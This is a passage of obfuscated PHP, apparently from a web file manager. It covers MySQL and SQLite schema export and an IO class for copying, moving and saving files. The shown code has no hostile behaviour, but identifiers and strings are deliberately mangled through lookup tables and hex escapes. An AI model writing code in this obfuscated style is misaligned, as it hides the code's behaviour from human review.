array_change_key_case($Îğ°¯™å); $î“®¼¿ë = $Îğ°¯™å[$Şı‡Ö²à[1008]]; if ($î“®¼¿ë == $Şı‡Ö²à[1005]) { $±–œÇí = explode($Şı‡Ö²à[4], $Îğ°¯™å[$Şı‡Ö²à[1014]]); $î“®¼¿ë = $±–œÇí[0]; } $“‚ÙèëÍ = array($Şı‡Ö²à[1136] => $Şı‡Ö²à[23], $Şı‡Ö²à[953] => $Şı‡Ö²à[845]); if (isset($“‚ÙèëÍ[$î“®¼¿ë])) { $î“®¼¿ë = $“‚ÙèëÍ[$î“®¼¿ë]; } return $î“®¼¿ë; } public function sqlFromMysql($Û×üİØ“, $Åâø…ÂŠ = '') { $Ö°„ŞØš =& $_SERVER[•€áå–Õ]; $»®´À¼¸ = $this->model()->db(); $å¿­Ú¬ì = $»®´À¼¸->query($Ö°„ŞØš[1137] . $Û×üİØ“ . $Ö°„ŞØš[440]); if (!$å¿­Ú¬ì || !$å¿­Ú¬ì[0]) { return !1; } $åš½êƒŒ = _get($å¿­Ú¬ì[0], $Ö°„ŞØš[1138], $Ö°„ŞØš[22]); if (!$åš½êƒŒ) { return !1; } $²¶¥Ø¢û = "\104\122\x4f\x50\40\124\101\x42\x4c\x45\x20\x49\x46\x20\105\x58\x49\x53\124\x53\40\140{$Û×üİØ“}\140\x3b" . PHP_EOL . $åš½êƒŒ . $Ö°„ŞØš[83]; if ($Åâø…ÂŠ && $Åâø…ÂŠ == $Ö°„ŞØš[845]) { return $²¶¥Ø¢û; } $Šİ¤å˜‹ = array_change_key_case($GLOBALS[$Ö°„ŞØš[16]][$Ö°„ŞØš[31]]); $ôóåê¶â = $Šİ¤å˜‹[$Ö°„ŞØš[1013]]; $““î¹Ş… = $Ö°„ŞØš[1139] . $ôóåê¶â . $Ö°„ŞØš[1140] . $Û×üİØ“ . $Ö°„ŞØš[68]; $‚Á†§ö¦ = $Ö°„ŞØš[1141] . $Û×üİØ“ . $Ö°„ŞØš[941]; $•÷ŒºŠ = $»®´À¼¸->query($““î¹Ş…); if (empty($•÷ŒºŠ)) { $È…‹µÊ = array($Ö°„ŞØš[845] => $Ö°„ŞØš[22], $Ö°„ŞØš[23] => $Ö°„ŞØš[22]); return $Åâø…ÂŠ ? $È…‹µÊ[$Åâø…ÂŠ] : $È…‹µÊ; } $¯­“³ü¯ = $»®´À¼¸->query($‚Á†§ö¦); $À·ÒÍù¾ = $Ö°„ŞØš[22]; $ß‘Ôãùı = array(); foreach ($¯­“³ü¯ as $ü¡ÙÁ) { if (!$À·ÒÍù¾ && $ü¡ÙÁ[$Ö°„ŞØš[1142]] == $Ö°„ŞØš[1143]) { $À·ÒÍù¾ = $ü¡ÙÁ[$Ö°„ŞØš[1144]]; } if (isset($ß‘Ôãùı[$ü¡ÙÁ[$Ö°„ŞØš[1142]]])) { $ß‘Ôãùı[$ü¡ÙÁ[$Ö°„ŞØš[1142]]][$Ö°„ŞØš[1145]][] = $ü¡ÙÁ[$Ö°„ŞØš[1144]]; continue; } $ß‘Ôãùı[$ü¡ÙÁ[$Ö°„ŞØš[1142]]] = array($Ö°„ŞØš[1146] => $ü¡ÙÁ[$Ö°„ŞØš[1142]], $Ö°„ŞØš[1145] => array($ü¡ÙÁ[$Ö°„ŞØš[1144]]), $Ö°„ŞØš[1147] => $ü¡ÙÁ[$Ö°„ŞØš[1148]] == $Ö°„ŞØš[100] ? 0 : 1); } $Ò»¨¦üê = array(); foreach ($ß‘Ôãùı as $ü¡ÙÁ) { $­‘®À = $ü¡ÙÁ[$Ö°„ŞØš[1146]] == $Ö°„ŞØš[1143]; $´ûµŠ÷± = array($Ö°„ŞØš[1149], $ü¡ÙÁ[$Ö°„ŞØš[1147]] == $Ö°„ŞØš[100] && !$­‘®À ? $Ö°„ŞØš[1150] : $Ö°„ŞØš[22], $Ö°„ŞØš[1151], $Ö°„ŞØš[1152] . $Û×üİØ“ . $Ö°„ŞØš[21] . ($­‘®À ? $Ö°„ŞØš[1153] : $ü¡ÙÁ[$Ö°„ŞØš[1146]]) . $Ö°„ŞØš[130], $Ö°„ŞØš[1154], $Ö°„ŞØš[130] . $Û×üİØ“ . $Ö°„ŞØš[130], $Ö°„ŞØš[1155] . implode($Ö°„ŞØš[1156], $ü¡ÙÁ[$Ö°„ŞØš[1145]]) . $Ö°„ŞØš[1157]); $Ò»¨¦üê[] = implode($Ö°„ŞØš[63], $´ûµŠ÷±) . $Ö°„ŞØš[83]; } $°Šª­òú = array(); $ä§‰åº× = array($Ö°„ŞØš[1158] => $Ö°„ŞØš[1159], $Ö°„ŞØš[1159] => $Ö°„ŞØš[1159], $Ö°„ŞØš[343] => $Ö°„ŞØš[370], $Ö°„ŞØš[342] => $Ö°„ŞØš[370]); foreach ($•÷ŒºŠ as $ü¡ÙÁ) { $´ûµŠ÷± = array($Ö°„ŞØš[130] . $ü¡ÙÁ[$Ö°„ŞØš[1160]] . $Ö°„ŞØš[130], isset($ä§‰åº×[$ü¡ÙÁ[$Ö°„ŞØš[1161]]]) ? $ä§‰åº×[$ü¡ÙÁ[$Ö°„ŞØš[1161]]] : $ü¡ÙÁ[$Ö°„ŞØš[1162]], $ü¡ÙÁ[$Ö°„ŞØš[1163]] == $Ö°„ŞØš[939] ? $Ö°„ŞØš[1164] : $Ö°„ŞØš[1165], $ü¡ÙÁ[$Ö°„ŞØš[1160]] == $À·ÒÍù¾ ? $Ö°„ŞØš[1166] : $Ö°„ŞØš[22], $ü¡ÙÁ[$Ö°„ŞØš[990]] ? strtoupper(str_replace($Ö°„ŞØš[21], $Ö°„ŞØš[22], $ü¡ÙÁ[$Ö°„ŞØš[990]])) : $Ö°„ŞØš[22]); $°Šª­òú[] = trim(implode($Ö°„ŞØš[63], $´ûµŠ÷±)); } $Ôñª§ƒæ = array($Ö°„ŞØš[1167] . $Û×üİØ“ . $Ö°„ŞØš[1168], $Ö°„ŞØš[1169] . $Û×üİØ“ . $Ö°„ŞØš[1170], implode($Ö°„ŞØš[60] . PHP_EOL, $°Šª­òú), $Ö°„ŞØš[987]); $õç¨éåÏ = implode(PHP_EOL, array_merge($Ôñª§ƒæ, $Ò»¨¦üê)); if ($Åâø…ÂŠ && $Åâø…ÂŠ == $Ö°„ŞØš[23]) { return $õç¨éåÏ; } $È…‹µÊ = array($Ö°„ŞØš[845] => $²¶¥Ø¢û, $Ö°„ŞØš[23] => $õç¨éåÏ); return $Åâø…ÂŠ ? $È…‹µÊ[$Åâø…ÂŠ] : $È…‹µÊ; } public function sqlFromSqlite($ò–¾›ƒê, $Í‚Òƒ×× = '') { $”õŒ€‰ =& $_SERVER[•€áå–Õ]; $Õ¤¬ ı = $this->model()->db(); $Öªæ¿˜³ = "\x50\122\x41\x47\115\101\x20\x54\101\x42\114\x45\137\111\116\106\x4f\40\50\x27{$ò–¾›ƒê}\47\51"; $êöÛô = "\123\105\x4c\105\x43\124\x20\x2a\40\x46\122\117\115\x20\163\161\x6c\x69\164\x65\137\155\x61\163\164\145\x72\x20\127\x48\105\x52\105\x20\164\142\x6c\x5f\x6e\141\x6d\x65\x20\x3d\x20\47{$ò–¾›ƒê}\47"; $¯æ¾Í³© = $Õ¤¬ ı->query($Öªæ¿˜³); if (empty($¯æ¾Í³©)) { $À¸››ì€ = array($”õŒ€‰[845] => $”õŒ€‰[22], $”õŒ€‰[23] => $”õŒ€‰[22]); return $Í‚Òƒ×× ? $À¸››ì€[$Í‚Òƒ××] : $À¸››ì€; } $Ê‘Ó»Ò² = $Õ¤¬ ı->query($êöÛô); $‹ÎĞº…Î = $¯¢İ·À = array(); foreach ($Ê‘Ó»Ò² as $‰ğ±Å•) { if ($‰ğ±Å•[$”õŒ€‰[43]] == $”õŒ€‰[334]) { $‹ÎĞº…Î[] = $‰ğ±Å•[$”õŒ€‰[1171]]; } else { $¯¢İ·À[$‰ğ±Å•[$”õŒ€‰[42]]] = $‰ğ±Å•[$”õŒ€‰[1171]]; } } $Š¢£Å–´ = array_merge(array($”õŒ€‰[1167] . $ò–¾›ƒê . $”õŒ€‰[130]), $‹ÎĞº…Î, array_values($¯¢İ·À)); $Š¢£Å–´ = implode($”õŒ€‰[83] . PHP_EOL, $Š¢£Å–´) . $”õŒ€‰[83]; if ($Í‚Òƒ×× && $Í‚Òƒ×× == $”õŒ€‰[23]) { return $Š¢£Å–´; } $¡åÁ½¹ = array(); $÷İª‹‘ = array($”õŒ€‰[1159] => $”õŒ€‰[1172], $”õŒ€‰[370] => $”õŒ€‰[1173]); $¼†êÑ× = $”õŒ€‰[22]; foreach ($¯æ¾Í³© as $‰ğ±Å•) { if ($‰ğ±Å•[$”õŒ€‰[67]] == $”õŒ€‰[100]) { $¼†êÑ× = $‰ğ±Å•[$”õŒ€‰[42]]; } $Ö¶´µå = array($”õŒ€‰[440] . $‰ğ±Å•[$”õŒ€‰[42]] . $”õŒ€‰[440], isset($÷İª‹‘[$‰ğ±Å•[$”õŒ€‰[43]]]) ? $÷İª‹‘[$‰ğ±Å•[$”õŒ€‰[43]]] : $‰ğ±Å•[$”õŒ€‰[43]], $‰ğ±Å•[$”õŒ€‰[45]] == $”õŒ€‰[100] ? $”õŒ€‰[1164] : $”õŒ€‰[1174] . $‰ğ±Å•[$”õŒ€‰[66]], $‰ğ±Å•[$”õŒ€‰[67]] == $”õŒ€‰[100] ? $”õŒ€‰[1175] : $”õŒ€‰[22]); $¡åÁ½¹[] = trim(implode($”õŒ€‰[63], $Ö¶´µå)); } foreach ($¯¢İ·À as $ÉÁ·èø¦ => $˜’¼â¤•) { $ÔöœÊÓÏ = str_replace($”õŒ€‰[1176] . $ò–¾›ƒê . $”õŒ€‰[21], $”õŒ€‰[22], $ÉÁ·èø¦); $ä¢»ß¢Æ = str_replace(array($”õŒ€‰[130], $”õŒ€‰[998]), $”õŒ€‰[440], substr($˜’¼â¤•, stripos($˜’¼â¤•, $”õŒ€‰[315]))); if ($ÔöœÊÓÏ == $”õŒ€‰[1153]) { $Ô­•–‘› = $”õŒ€‰[1177] . $¼†êÑ× . $”õŒ€‰[1178]; } else { $Ô­•–‘› = (stripos($ÔöœÊÓÏ, $”õŒ€‰[21]) ? $”õŒ€‰[1179] : $”õŒ€‰[22]) . ($”õŒ€‰[1180] . $ÔöœÊÓÏ . $”õŒ€‰[1181] . $ä¢»ß¢Æ); } $¡åÁ½¹[] = $Ô­•–‘›; } $Ì¶â’Ÿñ = array($”õŒ€‰[1182] . $ò–¾›ƒê . $”õŒ€‰[1183], $”õŒ€‰[1184] . $ò–¾›ƒê . $”õŒ€‰[1185], implode($”õŒ€‰[60] . PHP_EOL, $¡åÁ½¹), $”õŒ€‰[1186]); $´ëĞÊ¶Ç = implode(PHP_EOL, $Ì¶â’Ÿñ); if ($Í‚Òƒ×× && $Í‚Òƒ×× == $”õŒ€‰[845]) { return $´ëĞÊ¶Ç; } $À¸››ì€ = array($”õŒ€‰[845] => $´ëĞÊ¶Ç, $”õŒ€‰[23] => $Š¢£Å–´); return $Í‚Òƒ×× ? $À¸››ì€[$Í‚Òƒ××] : $À¸››ì€; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($¢û¯‚ùï, $Å×îÙ¦ã) { $ÅÅÔ·Ìã =& $_SERVER[•€áå–Õ]; $ò‰¡¬Ë¦ = $Å×îÙ¦ã; $GLOBALS[$ÅÅÔ·Ìã[1187]] = $ÅÅÔ·Ìã[1188] . $¢û¯‚ùï; Hook::trigger($ÅÅÔ·Ìã[1188] . $¢û¯‚ùï . $ÅÅÔ·Ìã[1189], $ò‰¡¬Ë¦); $Ãø…„ñš = self::driverMake($Å×îÙ¦ã[0]); if (!$Ãø…„ñš) { return !1; } if (method_exists($Ãø…„ñš, $¢û¯‚ùï)) { $¥Äİ†ƒ = @call_user_func_array(array($Ãø…„ñš, $¢û¯‚ùï), $Å×îÙ¦ã); } else { if (method_exists($Ãø…„ñš, $ÅÅÔ·Ìã[1190])) { $¥Äİ†ƒ = @call_user_func_array(array($Ãø…„ñš, $¢û¯‚ùï), $Å×îÙ¦ã); } else { if (method_exists(self, $¢û¯‚ùï)) { $¥Äİ†ƒ = @call_user_func_array(array(self, $¢û¯‚ùï), $Å×îÙ¦ã); } else { $¥Äİ†ƒ = call_user_func_array(array(parent, $¢û¯‚ùï), $Å×îÙ¦ã); } } } Hook::trigger($ÅÅÔ·Ìã[1188] . $¢û¯‚ùï . $ÅÅÔ·Ìã[1191], $ò‰¡¬Ë¦, $¥Äİ†ƒ); return $¥Äİ†ƒ; } public static function init($‹ÀåÓ”) { return self::driverMake($‹ÀåÓ”); } public static function copy($Íñƒ±Ì, $øÜÅ³Å½, $Òúûìèˆ = false, $âö¹¨ß = false) { return self::copyMoveStart($Íñƒ±Ì, $øÜÅ³Å½, $Òúûìèˆ, $_SERVER[•€áå–Õ][597], $âö¹¨ß); } public static function move($á¡°Ê¸–, $•À÷á•Ú, $€¾¥×ÉÑ = false, $Ô¸İÅòµ = false) { return self::copyMoveStart($á¡°Ê¸–, $•À÷á•Ú, $€¾¥×ÉÑ, $_SERVER[•€áå–Õ][599], $Ô¸İÅòµ); } private static function copyMoveStart($›ŒØ, $Ã¯¢ö²‹, $ıÅÛªµ, $ˆ¥ïÜ¡¤, $ÏŒ˜Ãí€) { $¡ÑÂ£Á =& $_SERVER[•€áå–Õ]; $¸Áğµ— = array($›ŒØ, $Ã¯¢ö²‹, $ıÅÛªµ, $ÏŒ˜Ãí€); Hook::trigger($¡ÑÂ£Á[1188] . $ˆ¥ïÜ¡¤ . $¡ÑÂ£Á[1189], $¸Áğµ—); $¿½€ÅË = self::copyMove($›ŒØ, $Ã¯¢ö²‹, $ıÅÛªµ, $ˆ¥ïÜ¡¤, $ÏŒ˜Ãí€); Hook::trigger($¡ÑÂ£Á[1188] . $ˆ¥ïÜ¡¤ . $¡ÑÂ£Á[1191], $¸Áğµ—, $¿½€ÅË); return $¿½€ÅË; } public static function saveFile($ÒÄ«ïËÎ, $×—ª‚Ã‰, $©µ×È¢ì = true) { $„÷ÖØÌÌ =& $_SERVER[•€áå–Õ]; $·˜ô£« = self::info($×—ª‚Ã‰); $„ ãşÒ = self::driverMake($ÒÄ«ïËÎ); $•¨Øä¨È = self::driverMake($×—ª‚Ã‰); $Şò³‹Ò‘ = !1; if ($•¨Øä¨È->pathParse[$„÷ÖØÌÌ[1192]]) { $Şò³‹Ò‘ = $•¨Øä¨È; $Ÿäñ›êö = $•¨Øä¨È->pathParse[$„÷ÖØÌÌ[1192]]; $•¨Øä¨È = self::driverMake($Ÿäñ›êö); } if ($„ ãşÒ->pathParse[$„÷ÖØÌÌ[1192]]) { $âõ±‡— = $„ ãşÒ->pathParse[$„÷ÖØÌÌ[1192]]; $„ ãşÒ = self::driverMake($âõ±‡—); } $ïÇª¨µ± = $•¨Øä¨È->pathFather($×—ª‚Ã‰); $ºçè¬ùî = !0; if (!$©µ×È¢ì && self::driverIsSame($„ ãşÒ, $•¨Øä¨È)) { $ºçè¬ùî = !1; } $„áÀÇÔ = self::copyFile($„ ãşÒ, $ÒÄ«ïËÎ, $•¨Øä¨È, $ïÇª¨µ±, $·˜ô£«[$„÷ÖØÌÌ[42]], $ºçè¬ùî); if ($Şò³‹Ò‘) { $„áÀÇÔ = $Şò³‹Ò‘->getPathOuter($„áÀÇÔ); } return $„áÀÇÔ; } private static function copyMove($´¢ï¥Ì, $Å’Š°éï, $ÒË…¾Ò¹, $¯áŞÀ§ç, $°°ì·Ù = false) { $ÁƒÕ£ò³ =& $_SERVER[•€áå–Õ]; if (!$´¢ï¥Ì || $´¢ï¥Ì == $ÁƒÕ£ò³[18] || !$Å’Š°éï) { return !1; } ignore_timeout(); $Ñä•º‘é = self::driverMake($´¢ï¥Ì); $©šÛ½îŞ = self::driverMake($Å’Š°éï); $¨Å­ë­‰ = $¯áŞÀ§ç == $ÁƒÕ£ò³[599]; $Ü ßóı„ = !1; if ($©šÛ½îŞ->pathParse[$ÁƒÕ£ò³[1192]]) { $Ü ßóı„ = $©šÛ½îŞ; $Å’Š°éï = $©šÛ½îŞ->pathParse[$ÁƒÕ£ò³[1192]]; $©šÛ½îŞ = self::driverMake($Å’Š°éï); } if ($Ñä•º‘é->pathParse[$ÁƒÕ£ò³[1192]]) { $´¢ï¥Ì = $Ñä•º‘é->pathParse[$ÁƒÕ£ò³[1192]]; $Ñä•º‘é = self::driverMake($´¢ï¥Ì); } self::check($Ñä•º‘é, $´¢ï¥Ì, $©šÛ½îŞ, $Å’Š°éï); Hook::trigger($ÁƒÕ£ò³[1193], $Ñä•º‘é, $´¢ï¥Ì, $©šÛ½îŞ, $Å’Š°éï); $Ş§¶ Ö = self::driverIsSame($Ñä•º‘é, $©šÛ½îŞ); if ($Ş§¶ Ö) { if ($¯áŞÀ§ç == $ÁƒÕ£ò³[599] && !method_exists($©šÛ½îŞ, $ÁƒÕ£ò³[1194]) && trim($Å’Š°éï, $ÁƒÕ£ò³[18]) == trim($©šÛ½îŞ->pathFather($´¢ï¥Ì), $ÁƒÕ£ò³[18])) { if ($Ñä•º‘é->pathThis($´¢ï¥Ì) != $°°ì·Ù && !$Ñä•º‘é->isTypeObject()) { return $Ñä•º‘é->rename($´¢ï¥Ì, $°°ì·Ù); } return $©šÛ½îŞ->getPathOuter($´¢ï¥Ì); } if (method_exists($©šÛ½îŞ, $¯áŞÀ§ç)) { return $©šÛ½îŞ->{$¯áŞÀ§ç}($´¢ï¥Ì, $Å’Š°éï, $ÒË…¾Ò¹, $°°ì·Ù); } } if ($Ş§¶ Ö && $¯áŞÀ§ç == $ÁƒÕ£ò³[599] && $©šÛ½îŞ->getType() == $ÁƒÕ£ò³[118]) { $…ã¬ö€ = $©šÛ½îŞ->movePath($´¢ï¥Ì, $Å’Š°éï, $°°ì·Ù); if ($…ã¬ö€) { return $…ã¬ö€; } } $ş¤ıò”â = $Ñä•º‘é->isFile($´¢ï¥Ì); if (!$ş¤ıò”â && $©šÛ½îŞ->getType() == $ÁƒÕ£ò³[798] && $Ñä•º‘é->getType() == $ÁƒÕ£ò³[118]) { $…ã¬ö€ = $©šÛ½îŞ->copyFolderFromIO($Ñä•º‘é, $´¢ï¥Ì, $Å’Š°éï, $ÒË…¾Ò¹, $¨Å­ë­‰, $°°ì·Ù); } else { $…ã¬ö€ = self::copyPath($Ñä•º‘é, $´¢ï¥Ì, $©šÛ½îŞ, $Å’Š°éï, $ÒË…¾Ò¹, $¨Å­ë­‰, $ş¤ıò”â, $°°ì·Ù); } if ($…ã¬ö€ && $¨Å­ë­‰) { $Ñä•º‘é->remove($´¢ï¥Ì); } if ($Ü ßóı„) { $…ã¬ö€ = $Ü ßóı„->getPathOuter($…ã¬ö€); } return $…ã¬ö€; } private static function check($ıØğ°ÛÆ, $Í’øä, $£§¦†ò¥, &$è™è‹ê) { $ÀüäşÓ¨ =& $_SERVER[•€áå–Õ]; if (self::driverIsSame($ıØğ°ÛÆ, $£§¦†ò¥) && $ıØğ°ÛÆ->isFolder($Í’øä) && $ıØğ°ÛÆ->isParentOf($Í’øä, $è™è‹ê)) { show_json(LNG($ÀüäşÓ¨[1195]), !1); } if (!$ıØğ°ÛÆ->exist($Í’øä)) { show_json(LNG($ÀüäşÓ¨[117]), !1); } } private static function copyPath($·Å–éÁ·, $ÉîŞĞæ¦, $¨óå‚İÍ, $íµ±È©ñ, $“Œ­½ò¡, $èäÁÈç, $ºª¸ƒ‚ù, $¬¹ğÕ´ñ = false, $Õô‚®¬© = true) { $İ©ÁÙ„• =& $_SERVER[•€áå–Õ]; $êÑ‡øÓ = empty($¬¹ğÕ´ñ) && $¬¹ğÕ´ñ !== $İ©ÁÙ„•[224] ? $·Å–éÁ·->pathThis($ÉîŞĞæ¦) : $¬¹ğÕ´ñ; if ($“Œ­½ò¡) { $ø˜È¹¬ = $¨óå‚İÍ->fileNameExist($íµ±È©ñ, $êÑ‡øÓ); $á™±áõ = $êÑ‡øÓ; $êÑ‡øÓ = $¨óå‚İÍ->fileNameAuto($íµ±È©ñ, $êÑ‡øÓ, $“Œ­½ò¡, !$ºª¸ƒ‚ù); if (!$ø˜È¹¬ || $á™±áõ != $êÑ‡øÓ) { $“Œ­½ò¡ = !1; } if ($Õô‚®¬© && !$“Œ­½ò¡) { $¨óå‚İÍ->_data[$İ©ÁÙ„•[1196]] = !0; } } if ($ºª¸ƒ‚ù) { return self::copyFile($·Å–éÁ·, $ÉîŞĞæ¦, $¨óå‚İÍ, $íµ±È©ñ, $êÑ‡øÓ, $èäÁÈç); } if ($“Œ­½ò¡ == REPEAT_RENAME_FOLDER) { $“Œ­½ò¡ = !1; } $óïÆÁÇ = rtrim($íµ±È©ñ, $İ©ÁÙ„•[18]) . $İ©ÁÙ„•[18] . $êÑ‡øÓ; $ñ­ÙˆÃ› = $¨óå‚İÍ->mkdir($¨óå‚İÍ->getPath($óïÆÁÇ), $“Œ­½ò¡); $íµ±È©ñ = $¨óå‚İÍ->getPathInner($ñ­ÙˆÃ›); $½ÈÊì’° = $·Å–éÁ·->listPath($ÉîŞĞæ¦, !0); $½ÈÊì’° = is_array($½ÈÊì’°) ? $½ÈÊì’° : array($İ©ÁÙ„•[95] => array(), $İ©ÁÙ„•[94] => array()); $èäÁñòò = array_merge($½ÈÊì’°[$İ©ÁÙ„•[95]], $½ÈÊì’°[$İ©ÁÙ„•[94]]); foreach ($èäÁñòò as $Ù™æ˜Ò) { $µéÉà€ò = $Ù™æ˜Ò[$İ©ÁÙ„•[43]] == $İ©ÁÙ„•[226]; $ÉîŞĞæ¦ = $·Å–éÁ·->getPathInner($Ù™æ˜Ò[$İ©ÁÙ„•[96]]); $ˆ¢ŸËµÛ = self::copyPath($·Å–éÁ·, $ÉîŞĞæ¦, $¨óå‚İÍ, $íµ±È©ñ, $“Œ­½ò¡, $èäÁÈç, $µéÉà€ò, !1, !1); if (!$ˆ¢ŸËµÛ) { IO::errorTips($İ©ÁÙ„•[1197] . $ÉîŞĞæ¦ . $İ©ÁÙ„•[82] . $íµ±È©ñ); } } self::copyMoveKeepInfo($·Å–éÁ·, $ÉîŞĞæ¦, $ñ­ÙˆÃ›); return $ñ­ÙˆÃ›; } private static function copyFile($×ùî–ä¼, $§ØúÅˆˆ, $ŸÜÌğçŒ, $×º“‚¶À, $ˆÄË—’¨, $× À²ˆ½) { $©ê»… =& $_SERVER[•€áå–Õ]; $×º“‚¶À = $ŸÜÌğçŒ->getPath(rtrim($×º“‚¶À, $©ê»…[18]) . $©ê»…[18] . $ˆÄË—’¨); $ÓÌÙç‹ş = $©ê»…[1198] . time() . rand_string(5); Hook::trigger($©ê»…[1199], $×ùî–ä¼, $§ØúÅˆˆ, $ŸÜÌğçŒ, $×º“‚¶À, $ˆÄË—’¨, $ÓÌÙç‹ş); if (self::driverIsSame($×ùî–ä¼, $ŸÜÌğçŒ)) { if ($× À²ˆ½) { $½ÔÃê£Î = $ŸÜÌğçŒ->moveFile($§ØúÅˆˆ, $×º“‚¶À); } else { $½ÔÃê£Î = $ŸÜÌğçŒ->copyFile($§ØúÅˆˆ, $×º“‚¶À); } Hook::trigger($©ê»…[1200], $×ùî–ä¼, $§ØúÅˆˆ, $ŸÜÌğçŒ, $×º“‚¶À, $ˆÄË—’¨, $½ÔÃê£Î); self::copyMoveKeepInfo($×ùî–ä¼, $§ØúÅˆˆ, $½ÔÃê£Î); return $½ÔÃê£Î; } $¬Äı·•º = TEMP_FILES; if ($GLOBALS[$©ê»…[16]][$©ê»…[101]][$©ê»…[837]]) { $¬Äı·•º = $GLOBALS[$©ê»…[16]][$©ê»…[101]][$©ê»…[837]]; } $Ğ™¼ô• = $¬Äı·•º; mk_dir($Ğ™¼ô•); $Ä¿»î‘ı = $Ğ™¼ô• . $ÓÌÙç‹ş; $ëºÀ¼Ë¡ = $Ä¿»î‘ı; $Ä¿»î‘ı = $×ùî–ä¼->download($§ØúÅˆˆ, $Ä¿»î‘ı); $Ä¿»î‘ı = $×ùî–ä¼->iconvApp($Ä¿»î‘ı); if (substr($Ä¿»î‘ı, strlen($¬Äı·•º)) == $¬Äı·•º) { $× À²ˆ½ = !0; } $½ÔÃê£Î = $ŸÜÌğçŒ->upload($×º“‚¶À, $Ä¿»î‘ı, $× À²ˆ½); self::remove($ëºÀ¼Ë¡); Hook::trigger($©ê»…[1200], $×ùî–ä¼, $§ØúÅˆˆ, $ŸÜÌğçŒ, $×º“‚¶À, $ˆÄË—’¨, $½ÔÃê£Î); self::copyMoveKeepInfo($×ùî–ä¼, $§ØúÅˆˆ, $½ÔÃê£Î); return $½ÔÃê£Î; } private static function copyMoveKeepInfo($÷±ÎÒÔí, $ç¼ÛæÙô, $ÅàêÙ“) { if (!$ÅàêÙ“) { return; } $¸¢»Ï†² = $÷±ÎÒÔí->info($ç¼ÛæÙô); if (!is_array($¸¢»Ï†²)) { return; } IO::setModifyTime($ÅàêÙ“, $¸¢»Ï†²[$_SERVER[•€áå–Õ][97]]); } public static function pathFather($Ç±í–ÑĞ) { $Ïîï‹° = IO::init($Ç±í–ÑĞ); $ı€Äà–µ = $Ïîï‹°->pathFather($Ïîï‹°->path); return $Ïîï‹°->getPathOuter($ı€Äà–µ); } public static function fileOut($ÒŒııÉ§, $úÌê¤ÓÜ = false, $½™™è¼Ä = false, $í÷®¯€Â = '') { $º‹çÆ–Æ = self::driverMake($ÒŒııÉ§); if ($º‹çÆ–Æ->isFileOutServer()) { return $º‹çÆ–Æ->fileOutServer($ÒŒııÉ§, $úÌê¤ÓÜ, $½™™è¼Ä, $í÷®¯€Â); } return $º‹çÆ–Æ->fileOut($ÒŒııÉ§, $úÌê¤ÓÜ, $½™™è¼Ä, $í÷®¯€Â); } public static function fileOutImage($öáá€¹, $©´ƒØÖ = 250) { $Û¨Îôˆç = array(250, 600, 1200, 2000, 3000, 5000); for ($ğºÚÉÁ¢ = 0; $ğºÚÉÁ¢ < count($Û¨Îôˆç); $ğºÚÉÁ¢++) { if ($ğºÚÉÁ¢ == 0 && $©´ƒØÖ <= $Û¨Îôˆç[$ğºÚÉÁ¢]) { $©´ƒØÖ = $Û¨Îôˆç[$ğºÚÉÁ¢]; break; } else { if ($©´ƒØÖ > $Û¨Îôˆç[$ğºÚÉÁ¢ - 1] && $©´ƒØÖ <= $Û¨Îôˆç[$ğºÚÉÁ¢]) { $©´ƒØÖ = $Û¨Îôˆç[$ğºÚÉÁ¢]; break; } else { if ($ğºÚÉÁ¢ == count($Û¨Îôˆç) - 1 && $©´ƒØÖ > $Û¨Îôˆç[$ğºÚÉÁ¢]) { $©´ƒØÖ = $Û¨Îôˆç[$ğºÚÉÁ¢]; break; } } } } $¦´¾¾ÁÔ = self::driverMake($öáá€¹); if ($¦´¾¾ÁÔ->isFileOutServer()) { return $¦´¾¾ÁÔ->fileOutImageServer($öáá€¹, $©´ƒØÖ); } return $¦´¾¾ÁÔ->fileOutImage($öáá€¹, $©´ƒØÖ); } private static function driverIsSame($¢ãìµ€®, $„©€ïêì) { $ÌÓ¢æ°õ =& $_SERVER[•€áå–Õ]; $’¸Ÿ¼õ™ = $¢ãìµ€®->getType(); $ğÁ¹ƒèı = $„©€ïêì->getType(); if ($’¸Ÿ¼õ™ != $ğÁ¹ƒèı) { return !1; } if ($’¸Ÿ¼õ™ == $ÌÓ¢æ°õ[798]) { return !0; } if ($’¸Ÿ¼õ™ == $ÌÓ¢æ°õ[118]) { return !0; } if ($¢ãìµ€®->pathDriver == $„©€ïêì->pathDriver) { return !0; } return !1; } public static function copyUpdate($ÔÃ¤şá, $†çšÊÃ) { $»‚»ÀÚ =& $_SERVER[•€áå–Õ]; if (!IO::exist($ÔÃ¤şá)) { return !1; } if (!IO::exist($†çšÊÃ)) { IO::mkdir($†çšÊÃ); } $ò·¿æ³ë = array_to_keyvalue(self::listAllSimple($ÔÃ¤şá), $»‚»ÀÚ[96]); $ÏÊ—¸‘Ì = array_to_keyvalue(self::listAllSimple($†çšÊÃ), $»‚»ÀÚ[96]); $‡Ÿ—ßÌ… = array(); $çÆ…å²½ = array(); foreach ($ò·¿æ³ë as $Õğå€€á => $§ßÁâ£µ) { if (isset($ÏÊ—¸‘Ì[$Õğå€€á])) { if ($§ßÁâ£µ[$»‚»ÀÚ[87]] == 1) { continue; } if ($ÏÊ—¸‘Ì[$Õğå€€á][$»‚»ÀÚ[88]] == $§ßÁâ£µ[$»‚»ÀÚ[88]]) { continue; } } if ($§ßÁâ£µ[$»‚»ÀÚ[87]] == 1) { $çÆ…å²½[] = $†çšÊÃ . $»‚»ÀÚ[18] . trim($Õğå€€á, $»‚»ÀÚ[18]); continue; } $­Ñ½½¼ô = strstr(trim($Õğå€€á, $»‚»ÀÚ[18]), $»‚»ÀÚ[18]) ? get_path_father($Õğå€€á) : $»‚»ÀÚ[22]; $‡Ÿ—ßÌ…[] = array($»‚»ÀÚ[1201] => $§ßÁâ£µ[$»‚»ÀÚ[98]], $»‚»ÀÚ[1202] => rtrim($†çšÊÃ, $»‚»ÀÚ[18]) . $»‚»ÀÚ[18] . $­Ñ½½¼ô, $»‚»ÀÚ[1203] => $§ßÁâ£µ); } $Ûä¬¦Á = array($»‚»ÀÚ[226] => $‡Ÿ—ßÌ…, $»‚»ÀÚ[87] => $çÆ…å²½); Hook::trigger($»‚»ÀÚ[1204], $ÔÃ¤şá, $†çšÊÃ, $Ûä¬¦Á); foreach ($çÆ…å²½ as $§ßÁâ£µ) { IO::mkdir($§ßÁâ£µ); } foreach ($‡Ÿ—ßÌ… as $§ßÁâ£µ) { IO::copy($§ßÁâ£µ[$»‚»ÀÚ[1201]], $§ßÁâ£µ[$»‚»ÀÚ[1202]], REPEAT_REPLACE); } } public static function 